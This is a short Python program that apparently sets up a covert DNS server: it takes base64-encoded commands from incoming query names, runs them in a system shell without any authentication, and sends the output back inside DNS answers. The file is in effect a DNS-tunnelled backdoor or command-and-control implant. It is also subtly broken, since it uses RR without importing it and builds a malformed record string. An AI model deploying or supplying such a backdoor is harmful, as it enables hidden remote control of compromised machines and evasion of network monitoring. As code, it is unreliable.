from dnslib import DNSRecord
from dnslib.server import DNSServer, DNSHandler, BaseResolver
import base64
import subprocess

class CustomResolver(BaseResolver):
    def resolve(self, request, handler):
        # DNS Communication
        encoded_command = request.q.qname.label[0].decode()

        # Data Decoding
        decoded_command = base64.b64decode(encoded_command).decode()

        # Command Processing
        result = process_command(decoded_command)

        # Data Encoding
        encoded_result = base64.b64encode(result).decode()

        # Return DNS response
        response = DNSRecord(request=request)
        response.add_answer(*RR.fromZone(f"{encoded_result}.example.com"))
        return response

def process_command(command):
    # Process the received command and return the result
    # You can modify this function to handle different commands as needed
    try:
        output = subprocess.check_output(command, shell=True)
        return output
    except Exception as e:
        return str(e).encode()

# DNS Server setup
resolver = CustomResolver()
server = DNSServer(resolver)
server.start()
